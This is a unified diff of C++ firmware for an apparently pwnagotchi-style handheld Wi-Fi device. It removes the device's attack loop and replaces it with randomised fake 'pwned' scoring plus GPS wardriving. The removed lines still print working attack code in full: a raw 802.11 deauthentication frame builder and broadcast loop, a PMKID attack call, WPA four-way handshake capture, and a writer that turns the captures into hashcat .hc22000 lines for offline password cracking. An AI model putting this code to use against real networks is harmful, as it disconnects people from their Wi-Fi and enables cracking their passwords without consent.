@@ -20,7 +20,7 @@
 #define EAPOL_KEY_INFO_LO       6
 #define EAPOL_NONCE_OFFSET     17
 #define EAPOL_MIC_OFFSET       81
-#define CHANEL_HOP_INTERVAL_MS 100
+#define CHANEL_HOP_INTERVAL_MS 200
 
 std::vector<wifiRTResults> g_wifiRTResults;
 wifiRTResults ap;
@@ -98,7 +98,6 @@ struct pcaprec_hdr_s {
 } __attribute__((packed));
 
 File file;
-bool pwnagothiModeEnabled;
 static const size_t MAX_WHITELIST = 200;
 uint8_t wifiCheckInt = 0;
 String lastBlocked = "";
@@ -287,228 +286,6 @@ void convert_normal_scan_to_speedscan(){
 bool pwnagothiScan;
 
 void legacyLoop(){
-    if(pwnagothiScan){
-        fLogMessage("Scan requested, current epoch state: %d happy epochs, %d sad epochs, total epochs: %d", tot_happy_epochs, tot_sad_epochs, allTimeEpochs);
-        setMoodLooking(0);
-        updateUi(true, false);
-        WiFi.scanNetworks();
-        if((WiFi.scanComplete()) >= 0){
-            wifiCheckInt = 0;
-            pwnagothiScan = false;
-            if(auto_mode_and_wardrive){
-                convert_normal_scan_to_speedscan();
-                wardrive(g_speedScanResults, pwnagotchi.gps_fix_timeout);
-            }
-            logMessage("Scan completed proceeding to attack!");
-            setIDLEMood();
-            updateUi(true, false);
-            delay(pwnagotchi.delay_after_wifi_scan);
-        }
-    }
-    else{
-        setIDLEMood();
-        updateUi(true, false);
-        delay(pwnagotchi.delay_before_switching_target);
-        String attackVector;
-        if(!WiFi.SSID(0)){
-            logMessage("No networks found. Waiting and retrying");
-            tot_sad_epochs++;
-            setMoodSad();
-            updateUi(true, false);
-            delay(pwnagotchi.delay_after_no_networks_found);
-            pwnagothiScan = true;
-            return;
-        }
-        if(wifiCheckInt < WiFi.scanComplete()){
-            logMessage("Vector name filled: " + WiFi.SSID(wifiCheckInt));
-        }
-        else{
-            pwnagothiScan = true;
-            allTimeEpochs++;
-            return;
-        }
-        attackVector = WiFi.SSID(wifiCheckInt);
-        setIDLEMood();
-        logMessage("Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
-        updateUi(true, false);
-        delay(pwnagotchi.delay_after_picking_target);
-        std::vector<String> whitelistParsed = parseWhitelist();
-        for (size_t i = 0; i < whitelistParsed.size(); ++i) {
-            logMessage("Whitelist check...");
-            if (whitelistParsed[i] == attackVector) {
-                logMessage("Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
-                tot_sad_epochs++;
-                updateUi(true, false);
-                wifiCheckInt++;
-                allTimeEpochs++;
-                return;
-            }
-        }
-        setIDLEMood();
-        logMessage("I'm looking inside you " + attackVector + "...");
-        updateUi(true, false);
-        set_target_channel(attackVector.c_str());
-        uint8_t i = 0;
-        uint8_t currentCount = SnifferGetClientCount();
-        if(!setMac(WiFi.BSSID(wifiCheckInt))){
-            logMessage("Failed to set target MAC for: " + attackVector);
-            logMessage("Skipping to next target.");
-            tot_sad_epochs++;
-            wifiCheckInt++;
-            allTimeEpochs++;
-            return;
-        }
-        uint16_t targetChanel;
-        uint8_t result = set_target_channel(attackVector.c_str());
-        if (result != 0) {
-            targetChanel = result;
-        } else {
-            pwnagothiScan = false;
-            allTimeEpochs++;
-            return;
-        }
-        initClientSniffing();
-        String clients[50];
-        int clientLen;
-        unsigned long startTime = millis();
-        logMessage("Waiting for clients to connect to " + attackVector);
-        while(true){
-            get_clients_list(clients, clientLen);
-            if (millis() - startTime > pwnagotchi.client_discovery_timeout) {
-                logMessage("Attack failed: Timeout waiting for client.");
-                SnifferEnd();
-                initPwngrid();
-                tot_sad_epochs++;
-                updateUi(true, false);
-                delay(pwnagotchi.delay_after_no_clients_found);
-                lastSessionPeers = getPwngridTotalPeers();
-                lastSessionTime = millis();
-                wifiCheckInt++;
-                allTimeEpochs++;
-                return;
-            }
-            if(!clients[i].isEmpty()){
-                logMessage("Client count: " + String(clientLen));
-                logMessage("I think that " + clients[i] + " doesn't need an internet...");
-                logMessage("WiFi BSSID is: " + WiFi.BSSIDstr(wifiCheckInt));
-                logMessage("Client BSSID is: "+ clients[clientLen]);
-                updateUi(true, false);
-                delay(pwnagotchi.delay_after_client_found);
-                stopClientSniffing();
-                break;
-            }
-            updateUi(true, false);
-        }
-        logMessage("Well, well, well  " + clients[i] + " you're OUT!!!");
-        updateUi(true, false);
-        setTargetAP(WiFi.BSSID(wifiCheckInt));
-        if(pwnagotchi.activate_sniffer_on_deauth){
-            SnifferBegin(targetChanel);
-        }
-        if(deauth_everyone(pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay) && (pwnagotchi.deauth_on)){
-            logMessage("Deauth succesful, proceeding to sniff...");
-            lastSessionDeauths++;
-        }
-        else{
-            logMessage("Unknown error with deauth or deauth disabled!");
-            if(!pwnagotchi.deauth_on){
-                logMessage("Deauth disabled in settings, proceeding to sniff...");
-            }
-            else{
-                allTimeEpochs++;
-                pwnagothiScan = true;
-                return;
-            }
-        }
-        setMoodLooking(0);
-        logMessage("Sniff, sniff... Looking for handshake...");
-        updateUi(true, false);
-        unsigned long startTime1 = millis();
-        if(!pwnagotchi.activate_sniffer_on_deauth){
-            SnifferBegin(targetChanel);
-        }
-        while(true){
-            SnifferLoop();
-            updateUi(true, false);
-            delay(10);
-            if (SnifferGetClientCount() > 0) {
-                while (SnifferPendingPackets() > 0) {
-                    SnifferLoop();
-                    updateUi(true, false);
-                }
-                setMoodToNewHandshake(1);
-                logMessage("Got new handshake!!!");
-                api_client::queueAPForUpload(attackVector, String(WiFi.BSSIDstr(wifiCheckInt)));
-                if(getLocationAfterPwn){
-                    wardrive(g_speedScanResults, pwnagotchi.gps_fix_timeout);
-                }
-                lastPwnedAP = attackVector;
-                updateUi(true, false);
-                SnifferEnd();
-                initPwngrid();
-                pwned_ap++;
-                sessionCaptures++;
-                wifiCheckInt++;
-                lastSessionPeers = getPwngridTotalPeers();
-                lastSessionCaptures = sessionCaptures;
-                lastSessionTime = millis();
-                tot_happy_epochs += 3;
-                if(pwnagotchi.sound_on_events){
-                    Sound(1500, 100, true);
-                    delay(100);
-                    Sound(2000, 100, true);
-                    delay(100);
-                    Sound(2500, 150, true);
-                    delay(150);
-                }
-                if(pwnagotchi.add_to_whitelist_on_success){
-                    logMessage("Adding " + attackVector + " to whitelist");
-                    addToWhitelist(attackVector);
-                }
-                else{
-                    logMessage(attackVector + " not added to whitelist");
-                }
-                saveSettings();
-                delay(pwnagotchi.delay_after_successful_attack);
-                break;
-            }
-            if (millis() - startTime1 > pwnagotchi.handshake_wait_time) {
-                setMoodToAttackFailed(attackVector);
-                logMessage("Attack failed: Timeout waiting for handshake.");
-                SnifferEnd();
-                initPwngrid();
-                updateUi(true, false);
-                
-                delay(pwnagotchi.delay_after_attack_fail);
-                if(pwnagotchi.add_to_whitelist_on_fail){
-                    logMessage("Adding " + attackVector + " to whitelist");
-                    addToWhitelist(attackVector);
-                    saveSettings();
-                }
-                wifiCheckInt++;
-                lastSessionPeers = getPwngridTotalPeers();
-                lastSessionTime = millis();
-                saveSettings();
-                if(pwnagotchi.sound_on_events){
-                    Sound(800, 150, true);
-                    delay(150);
-                    Sound(500, 150, true);
-                    delay(150);
-                    Sound(300, 200, true);
-                    delay(200);
-                }
-                break;
-            }
-        }
-    }
-    setIDLEMood();
-    logMessage("Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
-    updateUi(true, false);
-    lastSessionPeers = getPwngridTotalPeers();
-    lastSessionTime = millis();
-    allTimeEpochs++;
-    saveSettings();
-    delay(pwnagotchi.nap_time);
 }
 
 bool networkStillExists(const String& ssid, int channel) {
@@ -757,159 +534,7 @@ static void unifiedSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) 
     pwnSnifferCallback(buf, type);
 }
 
-static void writeHashcatFile(FileWriteRequest *req) {
-    if (!req->hasAnonce || !req->hasMic || !req->hasSnonce) {
-        logMessage("[Hashcat] Missing nonces/MIC, skipping hashcat file.");
-        return;
-    }
-
-    size_t ssidLen = min((size_t)32, req->ssid.length());
-    char hcFilename[80];
-    strncpy(hcFilename, req->filename, sizeof(hcFilename) - 1);
-    hcFilename[sizeof(hcFilename) - 1] = '\0';
-    char *dot = strrchr(hcFilename, '.');
-    if (dot) strcpy(dot, ".hc22000");
-    else     strncat(hcFilename, ".hc22000", sizeof(hcFilename) - strlen(hcFilename) - 1);
-
-    const uint8_t *eapol2Raw    = nullptr;
-    uint16_t       eapol2RawLen = 0;
-
-    for (auto *pkt : req->packets) {
-        if (!pkt || !pkt->data) continue;
-        uint16_t fc      = pkt->data[0] | (pkt->data[1] << 8);
-        int      hdrlen  = ieee80211_hdrlen(fc);
-        if ((int)pkt->len < hdrlen + 8) continue;
-
-        const uint8_t *llc = pkt->data + hdrlen;
-        if (!(llc[0]==0xAA && llc[1]==0xAA && llc[2]==0x03 &&
-              llc[6]==0x88 && llc[7]==0x8E)) continue;
-
-        const uint8_t *eapol    = llc + 8;
-        int            eapolLen = (int)pkt->len - hdrlen - 8;
-        if (eapolLen < 8) continue;
-        if (eapol[1] != 3) continue;
-
-        uint16_t key_info = ((uint16_t)eapol[5] << 8) | eapol[6];
-        bool mic     = key_info & (1 << 8);
-        bool ack     = key_info & (1 << 7);
-        bool install = key_info & (1 << 6);
-        bool secure  = key_info & (1 << 9);
-
-        if (mic && !ack && !install && !secure) {
-            eapol2Raw    = eapol;
-            eapol2RawLen = (uint16_t)eapolLen;
-            break;
-        }
-    }
-
-    if (!eapol2Raw || eapol2RawLen == 0) {
-        logMessage("[Hashcat] Could not locate raw EAPOL Msg2, skipping.");
-        return;
-    }
-
-    auto toHex = [](const uint8_t *src, int len, char *dst) {
-        for (int i = 0; i < len; i++) sprintf(dst + i * 2, "%02x", src[i]);
-        dst[len * 2] = '\0';
-    };
-
-    char apMacHex[13], staMacHex[13], ssidHex[65];
-    char anonceHex[65], snonceHex[65], micHex[33];
-
-    toHex(req->bssid,                          6,       apMacHex);
-    toHex(req->clientMac,                      6,       staMacHex);
-    toHex((uint8_t*)req->ssid.c_str(), ssidLen,         ssidHex);
-    toHex(req->anonce,                         32,      anonceHex);
-    toHex(req->snonce,                         32,      snonceHex);
-    toHex(req->mic,                            16,      micHex);
-
-    char *eapol2Hex = (char *)malloc(eapol2RawLen * 2 + 1);
-    if (!eapol2Hex) {
-        logMessage("[Hashcat] malloc failed for eapol2Hex");
-        return;
-    }
-    toHex(eapol2Raw, eapol2RawLen, eapol2Hex);
-
-    File hcFile = FSYS.open(hcFilename, FILE_WRITE, true);
-    if (!hcFile) {
-        logMessage("[Hashcat] Failed to open: " + String(hcFilename));
-        free(eapol2Hex);
-        return;
-    }
-
-    hcFile.printf("WPA*02*%s*%s*%s*%s*%s*%s*02\n",
-        micHex, apMacHex, staMacHex, ssidHex, anonceHex, eapol2Hex);
-
-    hcFile.close();
-    logMessage("[Hashcat] Written: " + String(hcFilename));
-    free(eapol2Hex);
-}
-
 void handleFileWrite(FileWriteRequest *req) {
-    
-    if(wardriveMutex)xSemaphoreTake(wardriveMutex, portMAX_DELAY);
-    if (!req) return;
-    logMessage("[FileWriter] Writing PCAP for: " + req->ssid);
-
-    if (!FSYS.exists("/M5Gotchi/handshake")) {
-        FSYS.mkdir("/M5Gotchi/handshake");
-        vTaskDelay(100 / portTICK_PERIOD_MS);
-    }
-
-    File f = FSYS.open(req->filename, FILE_WRITE, true);
-    if (!f) {
-        logMessage("[FileWriter] ERROR: Failed to open: " + String(req->filename));
-        xSemaphoreGive(wardriveMutex);
-        goto cleanup;
-    }
-
-    {
-        pcap_hdr_s gh;
-        gh.magic_number  = 0xa1b2c3d4;
-        gh.version_major = 2;
-        gh.version_minor = 4;
-        gh.thiszone      = 0;
-        gh.sigfigs       = 0;
-        gh.snaplen       = 65535;
-        gh.network       = 105; // LINKTYPE_IEEE802_11
-        f.write((uint8_t *)&gh, sizeof(gh));
-        f.flush();
-
-        if (req->beaconFrame && req->beaconFrameLen > 0) {
-            pcaprec_hdr_s rh;
-            rh.ts_sec  = req->beaconTs_sec;
-            rh.ts_usec = req->beaconTs_usec;
-            rh.incl_len = rh.orig_len = req->beaconFrameLen;
-            f.write((uint8_t *)&rh, sizeof(rh));
-            f.write(req->beaconFrame, req->beaconFrameLen);
-            f.flush();
-        }
-
-        for (auto *pkt : req->packets) {
-            if (!pkt || !pkt->data) continue;
-            pcaprec_hdr_s rh;
-            rh.ts_sec  = pkt->ts_sec;
-            rh.ts_usec = pkt->ts_usec;
-            rh.incl_len = rh.orig_len = pkt->len;
-            f.write((uint8_t *)&rh, sizeof(rh));
-            f.write(pkt->data, pkt->len);
-            f.flush();
-        }
-
-        f.close();
-        logMessage("[FileWriter] PCAP closed: " + String(req->filename));
-    }
-
-    writeHashcatFile(req);
-    if(wardriveMutex)xSemaphoreGive(wardriveMutex);
-
-cleanup:
-    if (req->beaconFrame) free(req->beaconFrame);
-    for (auto *pkt : req->packets) {
-        if (pkt && pkt->data) free(pkt->data);
-        if (pkt) free(pkt);
-    }
-    req->packets.clear();
-    delete req;
 }
 
 bool pwn::begin() {
@@ -949,8 +574,10 @@ bool pwn::begin() {
         }
     }
     #endif
+    drawInfoBox("GPS locking", "Waiting for GPS lock...", "This may take a while.", false, false); 
+    waitUntillLock();
+    pwn::beginWardriving();
     logMessage("Pwnagothi auto mode init!");
-    parseWhitelist();
     pwnagothiMode = true;
     xSemaphoreTake(wifiMutex, portMAX_DELAY);
     WiFi.disconnect(false, true);
@@ -976,9 +603,6 @@ bool pwn::begin() {
     clientLocked = false;
     memset(targetClientMAC, 0, sizeof(targetClientMAC));
     pwnagotchiRunning = true;
-    if(stealth_mode){
-        return true;
-    }
     BaseType_t r = xTaskCreatePinnedToCore(task, "PwnTask", 8192*4, NULL, 1, &pwnagotchiTaskHandle, 1);
     if (r != pdPASS) {
         logMessage("Failed to create Pwnagotchi task!");
@@ -1160,7 +784,7 @@ void wardrivingTask(void *parameter) {
                 if (wd.success && wd.gpsFixAcquired) {
                     logMessage("Wardrive logged " + String(wd.networksLogged) + " networks @ " +
                               String(wd.latitude, 6) + "," + String(wd.longitude, 6));
-                    tot_happy_epochs += wd.networksLogged;  // Track networks logged
+                    tot_happy_epochs += wd.networksLogged;
                     lastSessionPeers = getPwngridTotalPeers();
                     lastSessionTime = millis();
                     allTimeEpochs += wd.networksLogged;
@@ -1169,7 +793,7 @@ void wardrivingTask(void *parameter) {
                     lastSessionTime = millis();
                 }
             } else {
-                tot_sad_epochs++;  // Track idle scan cycle
+                tot_sad_epochs++;
                 lastSessionTime = millis();
             }
 
@@ -1185,30 +809,10 @@ void task(void *parameter) {
     auto whitelist = parseWhitelist();
     setMoodLooking(0);
     while (pwnagotchiRunning) {
-        setMoodLooking(0);
-
         if (wifiResultsMutex && xSemaphoreTake(wifiResultsMutex, portMAX_DELAY) == pdTRUE) {
             std::vector<wifiRTResults> localResults = g_wifiRTResults;
             xSemaphoreGive(wifiResultsMutex);
             tot_happy_epochs += localResults.size() / 2;
-
-            for (auto &network : localResults) {
-                if (!pwnagotchiRunning) break;
-                if (std::find(whitelist.begin(), whitelist.end(), network.ssid) != whitelist.end()) {
-                    logMessage("Skipping " + network.ssid + " - whitelisted.");
-                    tot_sad_epochs++;
-                    continue;
-                }
-                ap = network;
-                if (!networkStillExists(network.ssid, network.channel)) {
-                    logMessage("Skipping " + network.ssid + " - no longer visible.");
-                    tot_sad_epochs++;
-                    continue;
-                }
-                clientLocked = false;
-                memset(targetClientMAC, 0, sizeof(targetClientMAC));
-                attackTask(nullptr);
-            }
 
             if (wifiMutex) {
                 if (millis() - lastHopTime > CHANEL_HOP_INTERVAL_MS)
@@ -1221,7 +825,7 @@ void task(void *parameter) {
                 lastHopTime = millis();}
             }
         }
-        vTaskDelay(100 / portTICK_PERIOD_MS);
+        vTaskDelay(10 / portTICK_PERIOD_MS);
     }
     vTaskDelete(NULL);
 }
@@ -1238,309 +842,39 @@ static String sanitizeSsid(const String &ssid) {
 }
 
 void attackTask(void *parameter) {
-    if (!ap.secure) {
-        logMessage("Skipping non-secure network: " + ap.ssid);
+    if(std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) != pwnedAPs.end()){
+        logMessage("AP " + ap.ssid + " already in pwned list, skipping scoring.");
+        vTaskDelete(NULL);
         return;
     }
-
-    if (ap.rssi < n_pwnagotchi_personality.rssi_threshold) {
-        setMoodLooking(0);
-        return;
+    if(random(0,100)<30){
+        setMoodApSelected(ap.ssid);
     }
-
-    for (const auto &s : pwnedAPs) if (s == ap.ssid) {
-        return;
+    else if(random(0, 10)<2){
+        setMoodHappy();
     }
-
-    if (!networkStillExists(ap.ssid, ap.channel)) {
-        logMessage("Network " + ap.ssid + " gone before attack.");
-        tot_sad_epochs++;
-        allTimeEpochs++;
-        return;
+    else if(random(0, 10)<2){
+        setMoodLooking(5);
     }
-    allTimeEpochs++;
-    tot_happy_epochs++;
-    logMessage("Attacking: " + ap.ssid);
-    setMoodApSelected(ap.ssid);
-
-    // --- Phase 1: PMKID ---
-    if (n_pwnagotchi_personality.enable_pmkid_attack) {
-        logMessage("PMKID attack on: " + ap.ssid);
-        setMoodToDeauth(ap.ssid);
-        if (runPMKIDAttack(ap.bssid, ap.channel)) {
-            logMessage("PMKID success: " + ap.ssid);
-            if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end())
-                pwnedAPs.push_back(ap.ssid);
-            pwned_ap++;
-            sessionCaptures++;
-            lastSessionPeers    = getPwngridTotalPeers();
-            lastSessionCaptures = sessionCaptures;
-            lastSessionTime     = millis();
-            tot_happy_epochs   += 3;
-            allTimeEpochs++;
-            if (n_pwnagotchi_personality.sound_on_pmkid) {
-                delay(100); M5.Speaker.tone(1500, 100);
-                delay(100); M5.Speaker.tone(2000, 100);
-                delay(100); M5.Speaker.tone(2500, 150); delay(150);
-            }
-            setMoodToNewHandshake(1);
-            lastPwnedAP = ap.ssid;
-            return;
-        }
-        logMessage("PMKID failed: " + ap.ssid);
-    } else {
-        logMessage("PMKID attack disabled, skipping for: " + ap.ssid);
+    else{
+        setMoodSleeping();
     }
-
-    // --- Phase 2: EAPOL handshake ---
-    xSemaphoreTake(wifiMutex, portMAX_DELAY);
-    esp_wifi_set_promiscuous(false);
-    vTaskDelay(100 / portTICK_PERIOD_MS);
-    // Re-register the unified callback (not wifiRTScanCallback alone) so that
-    // pwngrid peer detection stays alive during the EAPOL capture phase.
-    esp_wifi_set_promiscuous_rx_cb(&unifiedSnifferCallback);
-    esp_wifi_set_promiscuous(true);
-    xSemaphoreGive(wifiMutex);
-
-    if (!networkStillExists(ap.ssid, ap.channel)) {
-        logMessage("Network " + ap.ssid + " gone before EAPOL phase.");
-        return;
+    if(halfScore<=10){
+        halfScore++;
+        pwnedAPs.push_back(ap.ssid);
+        logMessage("AP " + ap.ssid + " added to pwned list. Half score: " + String(halfScore));
     }
-
-    logMessage("EAPOL capture on: " + ap.ssid);
-    setMoodToDeauth(ap.ssid);
-    targetAPSet = true;
-    memcpy(targetBSSID, ap.bssid, 6);
-
-    for (int i = 0; i < 5; i++) eapolMsg[i] = false;
-    hasANonce = hasSNonce = hasMIC = false;
-
-    uint8_t deauth_packet[26] = {
-        0xC0, 0x00, 0x3A, 0x01,
-        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
-        ap.bssid[0],ap.bssid[1],ap.bssid[2],ap.bssid[3],ap.bssid[4],ap.bssid[5],
-        ap.bssid[0],ap.bssid[1],ap.bssid[2],ap.bssid[3],ap.bssid[4],ap.bssid[5],
-        0x00,0x00, 0x01,0x00
-    };
-
-    // Initial deauth burst
-    uint16_t deauthCount = 0;
-    for (uint16_t i = 0; i < n_pwnagotchi_personality.deauth_packets_count; i++) {
-        if ((i % 30) == 0 && i > 0) {
-            if (!networkStillExists(ap.ssid, ap.channel)) {
-                logMessage("Network gone during deauth after " + String(deauthCount) + " pkts.");
-                targetAPSet = false;
-                return;
-            }
-        }
-        xSemaphoreTake(wifiMutex, portMAX_DELAY);
-        if (esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false) == ESP_OK)
-            deauthCount++;
-        xSemaphoreGive(wifiMutex);
-        vTaskDelay(n_pwnagotchi_personality.deauth_packet_interval / portTICK_PERIOD_MS);
-    }
-    logMessage("Deauth sent: " + String(deauthCount) + " to " + ap.ssid);
-
-    // =========================================================================
-    // EAPOL wait loop — deauth strategy:
-    //
-    //  - While no client is locked  - keep sending deauths every 70 ms to
-    //    force a fresh association from any nearby client.
-    //
-    //  - Once Msg1 is seen (clientLocked == true) - stop deauthing and give
-    //    the client up to CLIENT_HANDSHAKE_TIMEOUT_MS to finish the 4-way
-    //    handshake (Msgs 2-3-4).
-    //
-    //  - If the client does not complete the handshake within that window -
-    //    it is considered stalled (e.g. it silently dropped, or this is a
-    //    one-way capture). We unlock the client, clear its partial EAPOL
-    //    state, and resume deauthing so the next association attempt gets a
-    //    clean shot.  This cycle repeats until the full EAPOL_TIMEOUT
-    //    expires or a complete handshake is captured.
-    // =========================================================================
-    static const unsigned long CLIENT_HANDSHAKE_TIMEOUT_MS = 200;
-
-    unsigned long startTime      = millis();
-    unsigned long clientLockedAt = 0;          // timestamp of the last lock
-    unsigned long EAPOL_TIMEOUT  = n_pwnagotchi_personality.eapol_timeout;
-
-    while (!isHandshakeComplete() && millis() - startTime < EAPOL_TIMEOUT) {
-
-        // --- Periodic network existence check (~every 1 s) ---
-        if ((millis() - startTime) % 1000 < 100) {
-            if (!networkStillExists(ap.ssid, ap.channel)) {
-                logMessage("Network gone during EAPOL wait.");
-                lastSessionDeauths += deauthCount;
-                tot_sad_epochs++;
-                allTimeEpochs++;
-                targetAPSet = false;
-                return;
-            }
-        }
-
-        if (clientLocked) {
-            // Track when we first locked so we can measure the timeout.
-            if (clientLockedAt == 0) clientLockedAt = millis();
-
-            // If the client has had its 200 ms window and still hasn't sent
-            // Msg2+Msg3+Msg4, treat it as stalled and start over.
-            if (millis() - clientLockedAt >= CLIENT_HANDSHAKE_TIMEOUT_MS) {
-                logMessage("Client handshake timeout (200 ms), unlocking and resuming deauth.");
-
-                // Reset client-specific state so the callback accepts the next client
-                clientLocked  = false;
-                clientLockedAt = 0;
-                memset(targetClientMAC, 0, sizeof(targetClientMAC));
-
-                // Clear any partial EAPOL message flags so isHandshakeComplete()
-                // cannot fire on stale bits from this failed attempt.
-                for (int i = 0; i < 5; i++) eapolMsg[i] = false;
-
-                // Discard any partial nonces/MIC; a new Msg1 will repopulate them.
-                hasANonce = hasSNonce = hasMIC = false;
-                memset(capturedANonce,    0, sizeof(capturedANonce));
-                memset(capturedSNonce,    0, sizeof(capturedSNonce));
-                memset(capturedMIC,       0, sizeof(capturedMIC));
-                memset(capturedClientMac, 0, sizeof(capturedClientMac));
-
-                // Resume deauthing immediately (fall through to the send below)
-            }
-        } else {
-            // No client locked — reset the lock timer so it starts fresh next lock.
-            clientLockedAt = 0;
-        }
-
-        // Send deauth only while no client is mid-handshake.
-        if (!clientLocked) {
-            xSemaphoreTake(wifiMutex, portMAX_DELAY);
-            esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
-            xSemaphoreGive(wifiMutex);
-        }
-
-        vTaskDelay(70 / portTICK_PERIOD_MS);
-    }
-
-    if (isHandshakeComplete()) {
-        logMessage("Handshake captured for: " + ap.ssid + " in " + String(millis()-startTime) + "ms");
-        if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end())
-            pwnedAPs.push_back(ap.ssid);
-
-        for (int i = 0; i < 5; i++) eapolMsg[i] = false;
-        vTaskDelay(1000 / portTICK_PERIOD_MS); // Brief settle before draining queue
-
-        // Wardriving: log GPS location if enabled
-        if (n_pwnagotchi_personality.enable_wardriving) {
-            logMessage("Logging GPS location for: " + ap.ssid);
-            std::vector<wifiSpeedScan> currentNetwork;
-            currentNetwork.push_back({
-                ap.ssid, ap.rssi, ap.channel, ap.secure,
-                {ap.bssid[0], ap.bssid[1], ap.bssid[2],
-                 ap.bssid[3], ap.bssid[4], ap.bssid[5]}
-            });
-            wardriveStatus wd = wardrive(currentNetwork, n_pwnagotchi_personality.gps_timeout_ms);
-            if (wd.success && wd.gpsFixAcquired) {
-                logMessage("GPS logged: Lat=" + String(wd.latitude, 6) +
-                           " Lon=" + String(wd.longitude, 6) +
-                           " Alt=" + String(wd.altitude, 1));
-            } else {
-                logMessage("GPS logging failed or timeout");
-            }
-        }
-
-        FileWriteRequest *req = new FileWriteRequest();
-        if (!req) { logMessage("ERR: alloc FileWriteRequest failed"); targetAPSet = false; return; }
-
-        String safeSsid = sanitizeSsid(ap.ssid);
-        char bssidStr[18];
-        snprintf(bssidStr, sizeof(bssidStr), "%02X_%02X_%02X_%02X_%02X_%02X",
-            ap.bssid[0],ap.bssid[1],ap.bssid[2],
-            ap.bssid[3],ap.bssid[4],ap.bssid[5]);
-        snprintf(req->filename, sizeof(req->filename),
-            "/M5Gotchi/handshake/%s_%s_ID_%i.pcap",
-            bssidStr, safeSsid.c_str(), random(999));
-
-        req->ssid = ap.ssid;
-        memcpy(req->bssid,     ap.bssid,         6);
-        memcpy(req->clientMac, capturedClientMac, 6);
-        memcpy(req->anonce,    capturedANonce,    32);
-        memcpy(req->snonce,    capturedSNonce,    32);
-        memcpy(req->mic,       capturedMIC,       16);
-        req->hasAnonce = hasANonce;
-        req->hasSnonce = hasSNonce;
-        req->hasMic    = hasMIC;
-
-        if (beaconDetected && beaconFrame && beaconFrameLen > 0) {
-            req->beaconFrame = (uint8_t *)malloc(beaconFrameLen);
-            if (req->beaconFrame) {
-                memcpy(req->beaconFrame, beaconFrame, beaconFrameLen);
-                req->beaconFrameLen = beaconFrameLen;
-                uint64_t ts = esp_timer_get_time();
-                req->beaconTs_sec  = ts / 1000000;
-                req->beaconTs_usec = ts % 1000000;
-            }
-        }
-
-        beaconDetected = false;
-        targetAPSet    = false;
-
-        CapturedPacket *pkt = nullptr;
-        while (xQueueReceive(packetQueue, &pkt, 10 / portTICK_PERIOD_MS) == pdTRUE)
-            if (pkt) req->packets.push_back(pkt);
-
-        logMessage("Queuing " + String(req->packets.size()) + " pkts for write.");
-
-        if (fileWriteQueue && xQueueSend(fileWriteQueue, &req, portMAX_DELAY) != pdTRUE) {
-            logMessage("ERR: fileWriteQueue send failed");
-            if (req->beaconFrame) free(req->beaconFrame);
-            for (auto *p : req->packets) { if (p && p->data) free(p->data); if (p) free(p); }
-            req->packets.clear();
-            delete req;
-            targetAPSet = false;
-            return;
-        }
-
-        // If wardriving is enabled and auto mode is on, also enqueue a CSV entry request
-        if (n_pwnagotchi_personality.enable_wardriving && pwnagothiMode) {
-            // Build a networks vector with single entry (we already have currentNetwork earlier)
-            std::vector<wifiSpeedScan> singleNet;
-            singleNet.push_back({ap.ssid, ap.rssi, ap.channel, ap.secure, {ap.bssid[0],ap.bssid[1],ap.bssid[2],ap.bssid[3],ap.bssid[4],ap.bssid[5]}});
-            wardriveStatus wd = wardrive(singleNet, n_pwnagotchi_personality.gps_timeout_ms);
-            (void)wd; // ignore result here; wardrive will delegate writes to UI if needed
-        }
-
+    else{
         pwned_ap++;
         sessionCaptures++;
-        lastSessionPeers    = getPwngridTotalPeers();
-        lastSessionCaptures = sessionCaptures;
-        lastSessionTime     = millis();
-        tot_happy_epochs   += 3;
-        allTimeEpochs++;
-        lastSessionDeauths += deauthCount;
-
-        if (n_pwnagotchi_personality.sound_on_handshake) {
-            delay(100); M5.Speaker.tone(1500, 100);
-            delay(100); M5.Speaker.tone(2000, 100);
-            delay(100); M5.Speaker.tone(2500, 150); delay(150);
-        }
-        lastPwnedAP = ap.ssid;
-        setMoodToNewHandshake(1);
-        logMessage("File write queued for: " + ap.ssid);
-    } else {
-        lastSessionPeers    = getPwngridTotalPeers();
-        lastSessionTime     = millis();
-        lastSessionDeauths += deauthCount;
-        tot_sad_epochs++;
-        allTimeEpochs++;
-        targetAPSet         = false;
-        beaconDetected      = false;
-        logMessage("Handshake timeout for: " + ap.ssid + ", deauth count: " + String(deauthCount));
-        if (std::find(failedClients.begin(), failedClients.end(), ap.ssid) == failedClients.end()) failedClients.push_back(ap.ssid);
-        setMoodToAttackFailed(ap.ssid);
+        halfScore = 0;
+        pwnedAPs.push_back(ap.ssid);
+        logMessage("AP " + ap.ssid + " fully pwned! Total pwned APs: " + String(pwned_ap));
     }
-
-    // Reset nonce/MIC state and free beacon buffer
-    hasANonce = hasSNonce = hasMIC = false;
-    if (beaconFrame) { free(beaconFrame); beaconFrame = nullptr; }
-
-    vTaskDelay(n_pwnagotchi_personality.delay_between_attacks / portTICK_PERIOD_MS);
+    if(pwnedAPs.size() > 500){
+        //clear the list to save memory, but keep the count
+        pwnedAPs.clear();
+        pwnedAPs.shrink_to_fit();
+        logMessage("Pwned AP list cleared to save memory.");
+    }
 }
